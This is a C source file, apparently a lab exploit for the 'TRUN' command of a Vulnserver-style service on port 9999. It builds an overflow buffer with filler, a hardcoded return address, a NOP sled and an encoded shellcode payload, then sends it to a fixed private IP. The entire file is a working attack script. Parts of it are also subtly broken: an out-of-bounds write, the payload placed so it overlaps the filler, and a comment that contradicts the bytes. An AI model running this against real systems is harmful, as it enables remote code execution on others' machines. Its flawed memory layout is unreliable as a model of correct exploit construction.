#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *host = "192.168.29.159";
    int port = 9999;
    char buffer[5005]; // 5000 characters for 'A' + 5 for "TRUN " and null terminator
    char payload[] = \
    "\xba\x62\xf2\xa6\xfa\xda\xc0\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x59\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x80\x07\x5a"
"\x12\xcb\xe8\xa3\xe3\xb3\xd9\x71\x87\xb8\x48\x46\xc3\xec"
"\x60\x2d\x81\x04\xf0\xd4\x17\xdb\x89\x65\x70\x2c\x39\xc3"
"\xa6\x03\x85\x78\x9a\x02\x79\x83\xcf\xe4\x40\x4c\x02\xe5"
"\x85\x1a\x68\x0a\x5b\xca\x19\x86\x4c\x7f\x5f\x1a\x6c\xaf"
"\xeb\x22\x16\xca\x2c\xd6\xaa\xd5\x7c\x9d\x6b\xf6\x2c\xa0"
"\x58\x7d\x84\xba\xdb\x4b\x61\x86\xd2\xb4\xc3\x7d\x20\xc0"
"\xd5\x57\x78\x16\x14\x98\x76\x3a\x96\xe1\xb1\xa2\xec\x19"
"\xc2\x5f\xf7\xda\xb8\xbb\x72\xfc\x1b\x4f\x24\xd8\x9a\x9c"
"\xb3\xab\x91\x69\xb7\xf3\xb5\x6c\x14\x88\xc2\xe5\x9b\x5e"
"\x43\xbd\xbf\x7a\x0f\x65\xa1\xdb\xf5\xc8\xde\x3b\x51\xb4"
"\x7a\x30\x70\xa3\xfb\xb9\x8a\xcc\xa1\x2d\x46\x01\x5a\xad"
"\xc0\x12\x29\x9f\x4f\x89\xa5\x93\x18\x17\x31\xa2\x0f\xa8"
"\xed\x0c\x5f\x56\x0e\x6c\x49\x9d\x5a\x3c\xe1\x34\xe3\xd7"
"\xf1\xb9\x36\x4d\xf8\x2d\x79\x39\xe1\x68\x11\x3b\x1a\x62"
"\xbe\xb2\xfc\xd4\x6e\x94\x50\x95\xde\x54\x01\x7d\x35\x5b"
"\x7e\x9d\x36\xb6\x17\x34\xd9\x6e\x4f\xa1\x40\x2b\x1b\x50"
"\x8c\xe6\x61\x52\x06\x02\x95\x1d\xef\x67\x85\x4a\x88\x87"
"\x55\x8b\x3d\x87\x3f\x8f\x97\xd0\xd7\x8d\xce\x16\x78\x6d"
"\x25\x25\x7f\x91\xb8\x1f\x0b\xa4\x2e\x1f\x63\xc9\xbe\x9f"
"\x73\x9f\xd4\x9f\x1b\x47\x8d\xcc\x3e\x88\x18\x61\x93\x1d"
"\xa3\xd3\x47\xb5\xcb\xd9\xbe\xf1\x53\x22\x95\x81\x94\xdc"
"\x6b\xae\x3c\xb4\x93\xee\xbc\x44\xfe\xee\xec\x2c\xf5\xc1"
"\x03\x9c\xf6\xcb\x4b\xb4\x7d\x9a\x3e\x25\x81\xb7\x9f\xfb"
"\x82\x34\x04\x0c\xf8\x35\xbb\xed\xfd\x5f\xd8\xee\xfd\x5f"
"\xde\xd3\x2b\x66\x94\x12\xe8\xdd\xa7\x21\x4d\x77\x22\x49"
"\xc1\x87\x67";
    memset(buffer, 0, sizeof(buffer)); // initialize to 0
    strcpy(buffer, "TRUN /.:/");
    buffer[5007] = '\0'; // Null-terminate the b
    memset(buffer+7, 'A', 2003); // Fill buffer with 'A's
    memcpy(buffer + 2008, "\xaf\x11\x51\x62", 4); // Overwrite return address with "\xaf\x11\x50\x62"
    memset(buffer + 2012, '\x90', 10); // Fill with '\x90' (NOP sled)
    memcpy(buffer + 2022 - sizeof(payload), payload, sizeof(payload)); // Append the payload
    printf("%s",buffer);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;
    }

    printf("Socket created.\n");

    server.sin_addr.s_addr = inet_addr(host);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        return 1;
    }

    printf("Connected.\n");

    // Receive welcome message
    char recv_buf[1024];
    int recv_size = recv(sock, recv_buf, sizeof(recv_buf), 0);
    if (recv_size > 0) {
        recv_buf[recv_size] = '\0';
        printf("Received: %s\n", recv_buf);
    }

    printf("Sending Exploit\n");
    if (send(sock, buffer, strlen(buffer), 0) != strlen(buffer)) {
        perror("Send failed");
        return 1;
    }
    close(sock);

    return 0;
}